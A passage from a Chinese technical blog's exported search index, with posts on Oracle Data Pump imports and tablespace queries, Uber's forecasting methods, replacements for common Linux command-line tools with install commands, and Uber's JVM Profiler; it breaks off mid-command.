Impdp123456789101112131415161718$ more LOG_IMP_20200930.log;;;Import: Release 10.2.0.4.0 - 64bit Production on Friday, 11 September, 2020 0:17:07Copyright (c) 2003, 2007, Oracle. All rights reserved.;;;Connected to: Oracle Database 10g Enterprise Edition Release 10.2.0.4.0 - 64bit ProductionWith the Partitioning, OLAP, Data Mining and Real Application Testing optionsMaster table "DBUSER"."SYS_IMPORT_FULL_01" successfully loaded/unloadedStarting "DBUSER"."SYS_IMPORT_FULL_01": dbusername/********@dbnms directory=DIR_DP dumpfile=LOG_P_20200930.dmp remap_tablespace=DATALIST:DATALOG logfile=LOG_IMP_20200930.logProcessing object type TABLE_EXPORT/TABLE/TABLEProcessing object type TABLE_EXPORT/TABLE/TABLE_DATA. . imported "DBUSER"."USERLOGINFO":"P_20200930" 4.335 GB 46060706 rowsProcessing object type TABLE_EXPORT/TABLE/INDEX/INDEXORA-31684: Object type INDEX:"SLVIEW"."IND_USERLOGINFO_LOGTIME" already existsProcessing object type TABLE_EXPORT/TABLE/INDEX/STATISTICS/INDEX_STATISTICSORA-39111: Dependent object type INDEX_STATISTICS skipped, base object type INDEX:"DBUSER"."IND_USERLOGINFO_LOGTIME" already existsProcessing object type TABLE_EXPORT/TABLE/STATISTICS/TABLE_STATISTICS Impdp参数12345678910REMAP_SCHEMA=scott:system 更改ownerTABLESPACES=example 导入表空间TABLE_EXISTS_ACTION 追加数据table_exists_action &#123; skip 如果已存在表，则跳过并处理下一个对象； append 为表增加数据； truncate 截断表，然后为其增加新数据； replace 删除已存在表，重新建表并追加数据&#125; 迁移过程监控利用率123456789101112131415161718SELECT a.tablespace_name "表空间名",round(total) "表空间大小",free "表空间剩余大小",round((total - free)) "表空间使用大小",round(total / (1024 * 1024 * 1024)) "表空间大小(G)",round(free / (1024 * 1024 * 1024)) "表空间剩余大小(G)",round((total - free) / (1024 * 1024 * 1024)) "表空间使用大小(G)",round((total - free) / total, 4) * 100 "使用率 %"FROM (SELECT tablespace_name, SUM(bytes) freeFROM dba_free_spaceGROUP BY tablespace_name) a,(SELECT tablespace_name, SUM(bytes) totalFROM dba_data_filesGROUP BY tablespace_name) bWHERE a.tablespace_name = b.tablespace_name--and round((total - free) / total, 4) * 100 &gt; 80order by round((total - free) / total, 4) * 100 desc 调整表空间123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657ALTER TABLESPACE DATAFLUX ADD DATAFILE '/oradata6/dbnms/dataflux601.dbf' SIZE 4096M;--1、查看表空间的名称及大小SELECT t.tablespace_name, round(SUM(bytes / (1024 * 1024)), 0) ts_sizeFROM dba_tablespaces t, dba_data_files dWHERE t.tablespace_name = d.tablespace_nameGROUP BY t.tablespace_name;--2、查看表空间物理文件的名称及大小SELECT tablespace_name,file_id,file_name,round(bytes / (1024 * 1024), 0) total_spaceFROM dba_data_fileswhere tablespace_name='DATACFG'ORDER BY tablespace_name;select * from dba_data_files;--3、查看回滚段名称及大小SELECT segment_name,tablespace_name,r.status,(initial_extent / 1024) initialextent,(next_extent / 1024) nextextent,max_extents,v.curext curextentFROM dba_rollback_segs r, v$rollstat vWHERE r.segment_id = v.usn(+)ORDER BY segment_name;--4、查看控制文件SELECT NAME FROM v$controlfile;--5、查看日志文件SELECT MEMBER FROM v$logfile;--6、查看表空间的使用情况SELECT SUM(bytes) / (1024 * 1024) AS free_space, tablespace_nameFROM dba_free_spaceGROUP BY tablespace_name;SELECT a.tablespace_name,a.bytes total,b.bytes used,c.bytes free,(b.bytes * 100) / a.bytes "% USED ",(c.bytes * 100) / a.bytes "% FREE "FROM sys.sm$ts_avail a, sys.sm$ts_used b, sys.sm$ts_free cWHERE a.tablespace_name = b.tablespace_nameAND a.tablespace_name = c.tablespace_name;--7、查看数据库库对象SELECT owner, object_type, status, COUNT(*) count#FROM all_objectsGROUP BY owner, object_type, status;--8、查看数据库的版本 SELECT versionFROM product_component_versionWHERE substr(product, 1, 6) = 'Oracle';--9、查看数据库的创建日期和归档方式SELECT created, log_mode, log_mode FROM v$database; 参考文献 Oracle initparams Oracle GoldenGate Doc Oracle GoldenGate 产品介绍 Using Oracle GoldenGate Microservices Architecture]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Uber 业务预测系统实践]]></title>
    <url>%2F2018%2F10%2F03%2FMachine-Learning-Uber%2F</url>
    <content type="text"><![CDATA[Forecasting is ubiquitous 如何利用预测来构建更好的产品和服务 定量预测方法可分为：基于模型（model-based）或因果关系，统计方法（statistical methods）和机器学习方法（machine learning approaches） Forecasting at Uber: An Introduction | September 6, 2018 | By Franziska Bell, Slawek Smyl 近年来，机器学习，深度学习和概率编程在精准预测方面显示出巨大潜力。除普通的统计算法外，Uber 还使用这三种技术构建预测解决方案。下面将讨论 Uber 预测系统使用的关键组件，流行方法，回溯测试和预测区间。 预测无处不在。除了战略预测之外（例如预测收入，生产和支出），产业界还需要能够针对短期战术行为作出准确预测（例如订货数量和招聘需求），以跟上企业的成长步伐。Uber 常见的预测场景包括： 市场预测（Marketplace forecasting）：作为 Uber 平台的一个关键要素，市场预测能够基于精准时间和空间的方式预测用户供需，以便引导驾驶员在高峰出现之前到达高需求区域，从而增加运输次数和收入。时空预测（Spatio-temporal forecasts）仍然是一个开放的研究领域。 硬件容量规划（Hardware capacity planning）：硬件供应不足可能导致服务中断、损害用户信任度，但是过度配置又会增加运营成本。预测可以帮助找到最佳点：不太多也不太少。 市场营销（Marketing）：了解不同媒体渠道的边际效果至关重要，需要兼顾趋势、季节性和其他动态因素（例如竞争或定价），同时，利用先进的预测方法构建更可靠的估价，并使大规模地制定基于数据驱动的营销决策成为可能。 ChallengeUber 平台在真实的物理世界运行，现实中的参与者的行为和兴趣各不相同，运行模式本身存在物理约束和不可预测性。物理约束，如地理距离和道路吞吐量，预测行为需要从时间域（temporal domain）转移到时空域(spatio-temporal domain)。尽管 Uber 是一家相对年轻的公司（已有8年历史），确保预测模型与高速成长的运营速度和规模保持同步至关重要。 下面的图2 提供了一个超过14个月的城市旅行数据示例。你可以注意到很多变化，同时可以看到一个增长的趋势和季节性周期（例如，12 月通常有更多的高峰日期，因为整个月份散布着很多主要假期）。如果我们将图形放大（图3）并切换到2017年7月的每小时数据，您会注意到每日和每周（7* 24）的季节性。你可能会注意到周末往往比平时更加繁忙。 预测方法需要能够针对上述复杂模式进行建模。 Prominent forecasting approaches除定性方法外，定量预测方法可分为以下几类：基于模型（model-based）或因果关系，统计方法（statistical methods）和机器学习方法（machine learning approaches）。 当问题的基础机制或物理原理是已知时，基于模型的预测方法效果最好，因此基于模型的方法应用于许多科学和工程环境中。基于模型也是计量经济学中的常用方法，模型遵循的理论基础不尽相同。 当基础机制未知或过于复杂时，例如股票市场，或者不完全已知，例如零售，通常应用简单的统计模型。属于这一类的流行经典方法包括 ARIMA（Autoregressive Integrated Moving Average,自回归求和移动平均模式），指数平滑方法，如 Holt-Winters ，以及Theta方法，它使用较少，但表现非常好。Theta 方法赢得了 M3 预测竞赛（M3 Forecasting Competition），我们也发现它在 Uber的时间序列上运行良好（此外，它的计算成本也很廉价）。 近年来，机器学习方法，包括分位数回归森林算法（quantile regression forests ，QRF），著名的随机森林算法的表兄弟，已成为预测工具包的一部分。如果有足够的数据，特别是外源性回归量，递归神经网络算法（Recurrent neural networks ，RNN）也被证明是非常有用的。通常，这些机器学习算法是黑盒模型，并且在不需要可解释性时使用。流行经典和机器学习预测方法概要： Classical &amp; Statistical Machine Learning Autoregressive integrated moving average (ARIMA) Exponential smoothing methods (e.g. Holt-Winters) Theta Recurrent neural networks (RNN) Quantile regression forest (QRF) Gradient boosting trees (GBM) Support vector regression (SVR) Gaussian Process regression (GP) 有趣的是，M4 预测竞赛（M4 Forecasting Competition）的获奖作品是一个混合模型 ES-RNN,Exponential Smoothing-Recurrent Neural Networks，其中包括手工编码平滑公式（灵感来自众所周知的 Holt-Winters 方法）和一堆扩展的长短期记忆单元（ long short-term memory units ，LSTM，一种时间递归神经网络）。 实际上，经典预测方法和机器学习方法彼此之间并没有区别，不过是通过模型是否更简单、可解释或更复杂和灵活来区分。在实践中，经典统计算法往往更快更容易使用。 在 Uber 为特定场景用例选择的预测方法实际一个包含许多参数的函数，包括可用的历史数据量、外生变量（例如，天气，音乐会等）是否发挥重要作用，以及业务需求（例如，模型是否需要可解释？）。然而，最重要的是，我们无法确定哪种方法会产生最佳性能，因此有必要比较多种方法的模型性能。 Comparing forecasting methods对于时间序列而言排序很重要，因此必须按时间顺序进行测试。实验者不能在中间切出一块，并在此部分之前和之后训练数据。相反，需要训练一组比测试数据更早的数据。 考虑到这一点，上面图4 中概述了两种主要方法：滑动窗口方法（the sliding window approach）和扩展窗口方法（the expanding window approach）。在滑动窗口方法中，使用固定大小的窗口（此处以黑色显示）进行训练。随后，针对橙色显示的数据测试该方法。 另一方面，扩展窗口方法使用越来越多的训练数据，同时保持测试窗口大小固定。如果要处理的数据量有限，后一种方法特别有效。将这两种方法结合起来也是可能的，而且通常最理想：从扩展窗口方法开始，当窗口变得足够大时，切换到滑动窗口方法。 在这个领域已经提出了许多评估指标，包括绝对误差（ absolute errors ）和百分比误差（percentage errors），这些指标有一些缺点。一种特别有用的方法是将模型性能与天真预测法（naive forecast）进行比较。在非季节性的情况下，天真预测法假设最后一个值等于下一个值。对于周期性时间序列，预测估计值等于先前的季节值（例如，对于具有每周周期性的每小时时间序列，天真预测法假设下一个值是一周前的当前小时的值）。 为了更容易地选择正确的预测方法，Uber 预测平台团队构建了一个名为 Omphalos 的回溯测试框架，该框架支持并行并且语言可扩展，以支持快速迭代和预测方法比较。 The importance of uncertainty estimation确定给定用例的最佳预测方法只是等式的一半。我们还需要估计预测区间。预测区间是预测值的上限和下限，预期实际值在某些（通常是高的）概率之间，例如， 0.9。图5 显示预测区间的工作原理： 在图5中，紫色的点表示预测完全相同。但是，左图中的预测区间比右图中的预测区间窄得多。预测区间的差异导致两种截然不同的预测结果，特别是考虑容量规划的背景下：第二次预测需要更高的容量储备以允许需求大幅增加的可能性。 预测区间与预测点本身一样重要，应始终包含在预测中。预测区间通常取决于我们拥有多少数据，此数据中有多少变化，我们预测的偏差以及使用的预测方法。 Next在后续的文章中将深入研究技术细节。本系列的下一篇文章将专门用于讨论数据预处理。 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 Uber 业务预测系统实践 参考文献 Understanding LSTM Networks 美团技术团队|外卖订单量预测异常报警模型实践 ES-RNN,Exponential Smoothing-Recurrent Neural Networks Quantile Regression Forests | Journal of Machine Learning Research 7 (2006) Omphalos, Uber’s Parallel and Language-Extensible Time Series Backtesting Tool]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Engineering Blog]]></title>
    <url>%2F2018%2F09%2F15%2FEngineering-Blog%2F</url>
    <content type="text"><![CDATA[摘要 Study The Master Study The Master Twitter Engineering Uber Engineering 美团技术团队 Confluent: Apache Kafka &amp; Streaming Platform for the Enterprise 参考文献]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>Developer</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Engineering Index]]></title>
    <url>%2F2018%2F09%2F11%2FEngineering-Index%2F</url>
    <content type="text"><![CDATA[摘要工程技术文献索引汇编 Psychology Psychology Today Machine Learning Machine Learning Articles TensorFlow:Large-Scale Machine Learning on Heterogeneous Distributed Systems (Preliminary White Paper, November 9, 2015) Design MapReduce: Simplified Data Processing on Large Clusters Coding Packet Capture, Injection, and Analysis with Gopacket Perf Linux Performance Analysis in 60,000 Milliseconds 《Dapper, a Large-Scale Distributed Systems Tracing Infrastructure|Google Technical Report dapper-2010-1, April 2010》 Security 10 layers of Linux container security Networking RFC ARCHITECTURAL SUPPORT FOR SECURITY MANAGEMENT IN ENTERPRISE NETWORKS]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>Developer</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How Linux Works：Linux Commands Extension]]></title>
    <url>%2F2018%2F09%2F03%2FLinux-Commands-New%2F</url>
    <content type="text"><![CDATA[DevOps 资讯 | 是时候升级你的命令行了 autojump &gt; cd bat &gt; cat prettyping &gt; ping fzf &gt; ctrl+r htop &gt; top diff-so-fancy &gt; diff fd &gt; find ncdu &gt; du tldr &gt; man ack || ag &gt; grep jq &gt; grep et al DevOps 资讯 | 是时候升级你的命令行了 子贡问为仁。子曰：“工欲善其事，必先利其器。居是邦也，事其大夫之贤者，友其士之仁者。”——《论语·卫灵公》 AutoJump &gt; cdautojump 记录你访问过的文件夹（包括记录访问频率进而调整权重），通过路径 cache 实现文件夹位置快速切换。了解更多 cd is Wasting Your Time Install 1234567# sourcegit clone git://github.com/wting/autojump.gitcd autojump./install.py or ./uninstall.py# macbrew install autojumpport install autojump Example 12345678910111213141516171819202122232425262728293031323334353637383940414243aca80164:~ kurui$ j -s10.0: /Users/yanrui/project/riboseyim.com50.0: /Users/yanrui/project-third/autojump50.0: /Users/yanrui/project/riboseyim.github.io/source/_posts________________________________________109: total weight3: number of entries0.00: current directory weightdata: /Users/yanrui/Library/autojump/autojump.txtaca80164:~ kurui$aca80164:~ kurui$ cd project/ebook-linuxperfmaster/aca80164:ebook-linuxperfmaster kurui$ j -s10.0: /Users/yanrui/project/riboseyim.com14.1: /Users/yanrui/project/ebook-linuxperfmaster50.0: /Users/yanrui/project-third/autojump50.0: /Users/yanrui/project/riboseyim.github.io/source/_posts________________________________________124: total weight4: number of entries14.14: current directory weightdata: /Users/yanrui/Library/autojump/autojump.txtaca80164:ebook-linuxperfmaster kurui$aca80164:ebook-linuxperfmaster kurui$ j post/Users/yanrui/project/riboseyim.github.io/source/_postsaca80164:_posts kurui$ pwd/Users/yanrui/project/riboseyim.github.io/source/_postsaca80164:_posts kurui$ j -s10.0: /Users/yanrui/project/riboseyim.com22.4: /Users/yanrui/project/ebook-linuxperfmaster50.0: /Users/yanrui/project-third/autojump52.0: /Users/yanrui/project/riboseyim.github.io/source/_posts________________________________________134: total weight4: number of entries51.96: current directory weightdata: /Users/yanrui/Library/autojump/autojump.txtaca80164:_posts kurui$ bat &gt; catcat 被用于打印文件内容。ccat 工具还提供像语法高亮显示这样的功能。在此基础之上，bat 还支持 分页, 行号和 git 集成。同时允许在输出中搜索 (当输出长于屏幕高度时) 。更多信息：https://github.com/sharkdp/bat 123456789# Linuxwget https://github.com/sharkdp/bat/releases/download/v0.6.1/bat-v0.6.1-x86_64-unknown-linux-gnu.tar.gzmake install# Macbrew install bat#alias cat=&apos;bat&apos; prettyping &gt; pingping 是一种非常有用的网络工具。原理是向目标主机传出一个ICMP echo@要求数据包，并等待接收 echo 回应数据包。程序会按时间和成功响应的次数估算丢失数据包率（丢包率）和数据包往返时间（网络时延，Round-trip delay time）。不过默认的 ping 命令输出比较乏味。prettyping 则提供了更友好、更美观的输出，包括彩色点图表示网络连通性。prettyping 基于 bash 和 awk 编写能，够兼容大部分操作系统 (例如 Linux, BSD, Mac OS X, …)。更多信息：http://denilson.sa.nom.br/prettyping/ 12345curl -O https://raw.githubusercontent.com/denilsonsa/prettyping/master/prettypingchmod +x prettyping./prettyping baiud.comalias ping=&apos;prettyping --nolegend&apos; fzf &gt; ctrl+r在终端中使用 ctrl + r 组合键可以向后搜索历史操作记录（ 尽管有点繁琐 ）。fzf 工具是对 ctrl + r 的增强。支持对终端操作历史的模糊搜索, 预览可能的匹配结果。除了历史搜索之外, fzf 还可以预览和打开文件。更多信息：https://github.com/junegunn/fzf 12345678910# Linuxgit clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf~/.fzf/install# Macbrew install fzf# aliasalias preview=&quot;fzf --preview &apos;bat --color \&quot;always\&quot; &#123;&#125;&apos;&quot;# add support for ctrl+o to open selected file in VS Codeexport FZF_DEFAULT_OPTS=&quot;--bind=&apos;ctrl-o:execute(code &#123;&#125;)+abor htop &gt; toptop 是一个快速诊断系统性能的工具。值得一提的是 top for Mac 与 Linux 上的输出不太一样。htop 优化了顶部输出格式，并支持大量的颜色, 键盘快键键和视图, 帮助我们洞察进程行为。更多信息：http://hisham.hm/htop/ htop 提供的键盘快捷键： P - 按 CPU 利用率排序 M - 按内存利用率排序 F4 - 按字符串过滤进程 space - 高亮显示某一进程，便于持续跟踪 1alias top=&quot;sudo htop&quot; # alias top diff-so-fancy &gt; diffGIT 版本控制系统中使用 git diff 来显示两个版本之间差别(包括文件、元数据和改动等)。diff-so-fancy 是一个用 node.js 实现的命令行工具，提供更友好的输出样式和定制能力。更多信息：https://github.com/so-fancy/diff-so-fancy 1234567# downloadwget https://raw.githubusercontent.com/so-fancy/diff-so-fancy/master/third_party/build_fatpack/diff-so-fancychmod +x diff-so-fancy# npmnpm install -g diff-so-fancy# 直接调用git diff --color | diff-so-fancy 在 git diff 和 git show 中启用 diff-so-fancy ，需要修改 gitconfig :123[pager] diff = diff-so-fancy | less --tabs=1,5 -RFX show = diff-so-fancy | less --tabs=1,5 -RFX 除了默认样式优化，diff-so-fancy 还支持颜色和显示项定制，例如：123456789101112131415git config --global color.ui truegit config --global color.diff-highlight.oldNormal &quot;red bold&quot;git config --global color.diff-highlight.oldHighlight &quot;red bold 52&quot;git config --global color.diff-highlight.newNormal &quot;green bold&quot;git config --global color.diff-highlight.newHighlight &quot;green bold 22&quot;git config --global color.diff.meta &quot;yellow&quot;git config --global color.diff.frag &quot;magenta bold&quot;git config --global color.diff.commit &quot;yellow bold&quot;git config --global color.diff.old &quot;red bold&quot;git config --global color.diff.new &quot;green bold&quot;git config --global color.diff.whitespace &quot;red reverse&quot;git config --bool --global diff-so-fancy.markEmptyLines false fd &gt; findfd 非常快。有意思的是 fd 与 bat 的作者是同一个人（David Peter）。更多信息：https://github.com/sharkdp/fd/ 常用的命令行：1234567891011121314## SourceCodegit clone https://github.com/sharkdp/fdcd fdcargo buildcargo testcargo install# Macbrew install fd## Usagefd cli # 查找所有包含&quot;cli&quot;的文件名fd -e md # 查找所有 .md 文件fd cli -x wc -w # 查找 &quot;cli&quot; 并运行 `wc -w` ncdu &gt; du了解磁盘空间占用情况是一项非常重要的工作。常用的命令是 du -sh (-sh 表示摘要、便于人工阅读), 但我们经常需要挖掘目录的空间占用。ncdu 是一个替代选择（完全基于 C 语言编写，MIT 许可证）。ncdu 提供了一个交互式界面, 支持快速扫描哪些文件夹或文件占用空间, 并且导航非常方便。更多信息：https://dev.yorhel.nl/ncdu 1234567891011git clone git://g.blicky.net/ncdu.git/# releasewget https://dev.yorhel.nl/download/ncdu-1.13.tar.gztar -xvf ncdu-1.13.tar.gz./configuremakemake install# Usagencdu path 123456alias du=&quot;ncdu --color dark -rr -x --exclude .git --exclude node_modules&quot;# 扩展选项--color dark - use a colour scheme-rr - read-only mode (prevents delete and spawn shell)--exclude ignore directories I won&apos;t do anything about tldr &gt; man几乎每一个命令行工具都可以通过手工输入 man 命令获得帮助信息。TL;DR 项目(“too long; didn’t read”)是一个由社区驱动的命令行文档系统，以非常简洁的方式提供命令行参数列表、使用说明和示例。更多信息：https://tldr.sh/ 1234567891011121314151617181920212223242526272829303132333435363738394041424344# Installnpm install -g tldralias help=&apos;tldr&apos;# UsageOptions: -V, --version output the version number -l, --list List all commands for the chosen platform in the cache -a, --list-all List all commands in the cache -1, --single-column List single command per line (use with options -l or -a) -r, --random Show a random command -e, --random-example Show a random example -f, --render [file] Render a specific markdown [file] -m, --markdown Output in markdown format -o, --os [type] Override the operating system [linux, osx, sunos] --linux Override the operating system with Linux --osx Override the operating system with OSX --sunos Override the operating system with SunOS -t, --theme [theme] Color theme (simple, base16, ocean) -s, --search [keywords] Search pages using keywords -u, --update Update the local cache -c, --clear-cache Clear the local cache -h, --help output usage information# Examplebash-3.2$ tldr tar✔ Page not found. Updating cache✔ Creating index tar Archiving utility. Often combined with a compression method, such as gzip or bzip. - Create an archive from files: tar cf target.tar file1 file2 file3 - Create a gzipped archive: tar czf target.tar.gz file1 file2 file3 - Extract an archive in a target folder: tar xf source.tar -C folder ack || ag &gt; grepgrep 无疑是一个强大的命令行工具, 但多年来它已被许多工具所取代，包括 ack 和 ag 。更多信息：[https://beyondgrep.com/] 1curl https://beyondgrep.com/ack-2.24-single-file &gt; ~/bin/ack &amp;&amp; chmod 0755 ~/bin/ack ack 和 ag 默认情况下使用正则表达式进行搜索,可以指定文件类型 —— 使用像 –js 或 –html 标志搜索。ack 和 ag 工具都支持 grep 选项, 如 -B (表示输出匹配行和其之后(after)的N行)。 ack 默认没有支持 markdown 格式，可以在 .ackrc 文件定制：12--type-set=md=.md,.mkd,.markdown--pager=less -FRX jq &gt; grep et al jq is like sed for JSON data jq 可以作为 JSON 数据转换工具。示例：更新节点依赖项 (分为多行以便于可读性)。更多信息：https://stedolan.github.io/jq/ 1234npm i $(echo $(\ npm outdated --json | \ jq -r &apos;to_entries | .[] | &quot;\(.key)@\(.value.latest)&quot;&apos; \)) 1234567891011121314&#123; &quot;node-jq&quot;: &#123; &quot;current&quot;: &quot;0.7.0&quot;, &quot;wanted&quot;: &quot;0.7.0&quot;, &quot;latest&quot;: &quot;1.2.0&quot;, &quot;location&quot;: &quot;node_modules/node-jq&quot; &#125;, &quot;uuid&quot;: &#123; &quot;current&quot;: &quot;3.1.0&quot;, &quot;wanted&quot;: &quot;3.2.1&quot;, &quot;latest&quot;: &quot;3.2.1&quot;, &quot;location&quot;: &quot;node_modules/uuid&quot; &#125;&#125; 12node-jq@1.2.0uuid@3.2.1 schedule How to Schedule Commands in Linux with the “at” Utility 电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读：性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM 扩展阅读：How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 cli-improved 10 Best Linux Terminal Console Games How to Schedule Commands in Linux with the “at” Utility]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:JVM]]></title>
    <url>%2F2018%2F08%2F07%2FLinux-Perf-JVM%2F</url>
    <content type="text"><![CDATA[摘要 Uber 开源 Java 分布式应用追踪工具：JVM Profiler Uber 开源 Java 分布式应用追踪工具：JVM Profiler 《JVM Profiler: An Open Source Tool for Tracing Distributed JVM Applications at Scale 》 Apache Spark 计算框架已经被广泛用来构建大规模数据应用。对 Uber 而言, 数据是战略决策和产品开发的核心。为了更好地利用这些数据, Uber 需要管理遍布全球的 Spark 实例。 Spark 使得数据技术更易于访问, 如果要做到对 Spark 应用程序的进行合理的资源分配, 优化数据基础架构的操作效率, 就需要对这些系统有更细粒度的洞察力, 即识别其资源使用模式。为了在不改变用户代码的情况下也能达成上述目标, Uber Engineering 团队构建并开源了 JVM Profiler —— 一个分布式探查器，用于收集性能和资源使用率指标为进一步分析提供服务。尽管它是为 Spark 应用而构建的, 但它的通用实现使其适用于任何基于 Java 虚拟机 ( Java virtual machine ，JVM) 的服务或应用程序。 Profiling challengesUber Engineering 每天的常规工作是支持数以万计的应用程序、运行在成千上万的机器上。随着技术栈的增长, 我们很快意识到现有的性能分析和优化方案无法满足需要。特别是: 目标1：应用级指标监控 Correlate metrics across a large number of processes at the application level 分布式环境中存在大量进程需要度量，包括在同一服务器上运行着多个 Spark 应用、多服务器上运行的 Spark 应用有大量的进程 (例如数以千计的执行者 executors ) , 如 图1 所示: Uber 现有的工具只能做到服务器级别的度量（server-level metrics）并且不能针对单个应用做到精确测量。我们需要一个解决方案, 可以收集每个过程的度量值, 并将它们与每个应用程序的进程关联起来。此外, 我们不知道这些过程将在何时启动, 以及它们将运行多长时间。为了能够在这种环境中收集度量, 需要在每个进程中自动启动探查器。 目标2：不侵入用户代码 Make metrics metrics collection non-intrusive for arbitrary user code 目前，Apache Spark 和 Apache Hadoop 库不支持导出性能指标; 但是在通常情况下, 我们需要在不更改用户或框架代码的情况下收集这些指标。例如, 如果在 Hadoop 文件系统 (Hadoop Distributed File System ，HDFS) NameNode 上遇到高时延的情况, 我们希望检查每个 Spark 应用中的延迟情况, 以确保这类问题不再重复出现。由于 NameNode 客户端代码嵌入到了 Spark 库中, 因此修改其源代码以添加特定度量是很麻烦的。为了跟上持续增长数据基础架构, 我们需要能够在任何时候对任何应用程序进行测量, 而不进行代码更改。此外, 实现一个非侵入性的度量值收集过程将使我们能够在加载中动态地向 Java 方法中注入代码。 JVM Profiler 简介为了解决上述两个难题, Uber Engineering 团队构建并开源了 JVM Profiler 。现有的同类开源工具, 比如 Etsy 的 statsd-jvm-profiler , 可以在单个应用程序级别收集度量, 但是不提供动态代码注入收集度量的能力。在这些工具的启发下, 我们的探查器提供了新功能, 如任意 Java 方法/参数分析。 JVM Profiler 由三项主要功能组成, 它使收集性能和资源使用率指标变得更容易, 然后可以将这些指标 (如 Apache Kafka) 提供给其他系统进行进一步分析: 代理功能 ( java agent ) : 支持用户以分布式的方式收集各种指标 (例如如 CPU/内存利用率) ，用于 JVM 进程的堆栈跟踪。 高级分析功能（Advanced profiling capabilities）: 支持跟踪任意 Java 方法和用户代码中的参数, 而不进行任何实际的代码更改。此功能可用于跟踪 Spark 应用的 HDFS NameNode RPC 调用延迟, 并标识慢速方法调用。它还可以跟踪每个 Spark 应用读取或写入的 HDFS 文件路径, 用以识别热文件后进一步优化。 数据分析报告( Data analytics reporting ): 使用 JVM Profile 可以将指标数据推送给 Kafka topics 和 Apache Hive tables , 提高数据分析的速度和灵活性。 JVM Profiler 典型用例JVM Profiler 支持各种用例, 最典型的是能够检测任意 Java 代码。基于简单的配置, JVM Profiler 就可以附加到 Spark 应用中的每个执行者（executor）收集 Java 方法运行时度量。下面, 我们对其中的一些用例进行了讨论: Right-size executor : JVM Profiler 中的内存度量支持跟踪每个执行者的实际内存使用情况。借此 可以在 Spark 应用中 ”executor-memory” 设置最优参数。 监视 HDFS NameNode RPC 延迟: 例如在 Spark 应用中对类 org.apache.hadoop.hdfs.protocolPB.ClientNamenodeProtocolTranslatorPB 的方法进行了分析并确定 NameNode 调用的延迟。Uber 每天都要监控5万多个 Spark 应用, 其中有数以亿计的这种 RPC 调用。 监视驱动程序丢弃的事件: 例如监视 org.apache.spark.scheduler.LiveListenerBus.onDropEvent, 跟踪 Spark 驱动程序事件队列太长、队列删除事件。 跟踪数据沿袭: 例如分析 Java 方法上的文件路径参数 ( org.apache.hadoop.hdfs.protocolPB.ClientNamenodeProtocolTranslatorPB.getBlockLocations , org.apache.hadoop.hdfs.protocolPB.ClientNamenodeProtocolTranslatorPB.addBlock ) , 可以跟踪哪些文件是由 Spark 应用读取和写入的。 JVM Profiler 实现JVM Profiler 具有非常简单且可扩展的设计。可以很容易地添加其他 Profiler 收集更多的指标, 也能部署自定义 reporter 向不同的系统发送数据指标。 一旦启动 JVM Profiler 代码即通过代理参数加载到一个 Java 进程中。它由三个主要部分组成: Class File Transformer类文件转换器介由进程内的 Java 方法字节码监视任意用户代码并在内部度量缓冲区中保存度量。 Metric Profilers CPU/Memory Profiler: 通过 JMX 收集 CPU/内存利用率并发送给 reporter Method Duration Profiler: 从度量缓冲区读取方法时延 (method duration) 并发送给 reporter Method Argument Profiler: 从度量缓冲区读取方法参数值（method argument ）并发送给 reporter Reporters Console Reporter: 控制台输出 Kafka Reporter: 发送到 Kafka topics JVM Profiler 扩展通过 -javaagent 选项可以构建自己的 reporter , 例如： 1java -javaagent:jvm-profiler-0.0.5.jar=reporter=com.uber.profiling.reporters.CustomReporter 数据基础设施整合 Uber 将 JVM Profiler 与自己的数据基础设施进行整合： Cluster-wide data analysis: 集群数据分析中指标数据首先推送到 Kafka 并存储于 HDFS, 用户最终通过 Hive/Presto/Spark 查询。 Real-time Spark application debugging: Uber 使用 Flink 实现单个应用的实时数据聚合并写入到 MySQL 数据库，这样用户就可以通过基于 Web 的接口查询指标。 JVM Profiler 应用示例：使用 JVM Profiler 跟踪一个简单的 Java 应用 首先，git clone 项目代码1git clone https://github.com/uber-common/jvm-profiler.git 然后，mvn package 构建 jvm-profiler jar1mvn clean package 最后，调用 JAR 运行 JVM Profiler (e.g.target/jvm-profiler-0.0.5.jar)1java 